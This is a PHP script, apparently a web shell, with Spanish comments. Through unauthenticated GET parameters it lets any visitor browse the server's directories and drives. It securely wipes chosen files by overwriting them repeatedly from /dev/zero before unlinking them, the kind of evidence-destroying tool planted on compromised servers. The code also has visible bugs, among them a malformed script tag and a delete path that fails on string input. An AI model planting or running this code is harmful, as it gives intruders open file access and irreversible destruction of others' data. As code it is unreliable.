<?php
//error_reporting(E_ERROR | E_PARSE);
        if (empty($_GET['dir'])) {
            $path = getcwd();
            @chdir($path);
            $dir = @dir($path);
        } else {
            $path = $_GET['dir'];
            @chdir($path);
            $dir = @dir($path);
        }
        $scans = range("B", "Z");
        foreach($scans as $drive) {
            $drive = $drive . ":\\";
            if (is_dir($drive)) {
                echo "&nbsp;&nbsp;" . "<a href=?dir=" . $drive . ">" . $drive . "</a>";
            }
        }
        echo "
<center>
<form action='' method=GET>
Directory : <input type=text name=dir value='" . $path . "'><input type=submit name=ir value=Enter>
</form>

";

        $archivos = array('dir' => array(), 'file' => array());
        while ($archivo = $dir->read()) {
            $ver = @filetype($path . '/' . $archivo);
            if ($ver == "dir") {
                $archivos['dir'][] = $path . '/' . $archivo;
            } else {
                $archivos['file'][] = $path . '/' . $archivo;
            }
        }
        $dir->rewind();
        if (count($archivos['dir']) == 0 and count($archivos['file'] == 0)) {
            echo "<script>alert('Directory empty');/<script>";
        }
        echo "<form action='' method=GET>";
        echo "<br>Directory Found : " . count($archivos['dir']) . "<br>";
        echo "Files Found : " . count($archivos['file']) . "<br>";
        echo "<table border=1>";
        echo "<td >Name</td><td >Type</td><td>Modification time</td>";
        echo "<td >Perms</td><td >Action</td>";
        echo "<tr>";
        foreach($archivos['dir'] as $dirs) {
            $dirsx = pathinfo($dirs);
            echo "<td ><a href=?dir=" . urlencode($dirs) . ">" . urlencode($dirsx['basename']) . "</a></td>";
            echo "<td >Directory</td>";
            echo "<td >" . date("F d Y H:i:s", fileatime($dirs)) . "</td>";
            echo "<td >" . dame($dirs) . "</a></td>";
            echo "<td><input type=checkbox disabled=disabled></td>";
            echo "</tr><tr>";
        }
        foreach($archivos['file'] as $files) {
            $filex = pathinfo($files);
            echo "<td >" . urlencode($filex['basename']) . "</td>";
            echo "<td >File</td>";
            echo "<td >" . date("F d Y H:i:s", fileatime($files)) . "</td>";
            echo "<td >" . dame($files) . "</a></td>";
            echo "<td><input type=checkbox name=delete[] value=" . $files . "></td>";
            echo "</tr><tr>";
        }
	print("</TABLE>  How many times rewrite <input type='number' name='rw' value='30'> <input type='submit' value='Delete'> </form>\n");
	print("<br>  Or enter directly the file <form type='get' > <input type='text' name='delete'> <input type='submit' value='delete' </p>  </form> </center> ");
    
//function to delete
function srm($file){
	global $directory;
	global $file;
	chmod($file, 0777);
	$size = filesize($file);
	// For to rewrite the data
	for ($i=0;$i<$_GET['rw'];$i++)
	{
		$src = fopen('/dev/zero', 'rb');
		$dest = fopen($file, 'wb');
		stream_copy_to_stream($src, $dest, $size);
	}
	echo "deleted ". $file;
	//Finish the delete
	unlink($file);
}
//Funcion para el peso en human-readable
function view_size($size)
{
 if (!is_numeric($size)) {return FALSE;}
 else
 {
  if ($size >= 1073741824) {$size = round($size/1073741824*100)/100 ." GB";}
  elseif ($size >= 1048576) {$size = round($size/1048576*100)/100 ." MB";}
  elseif ($size >= 1024) {$size = round($size/1024*100)/100 ." KB";}
  else {$size = $size . " B";}
  return $size;
  echo $size;
 }
}
//funcion para los permisos
function dame($file) {
        return substr(sprintf('%o', fileperms($file)), -4);
    }
// if to delete
if ($_GET['delete']){
	$files = $_GET['delete'];
	// por cada archivo que se encuentre en el array $files
	foreach ($files as $file) {
		srm($file);
	}
}

?>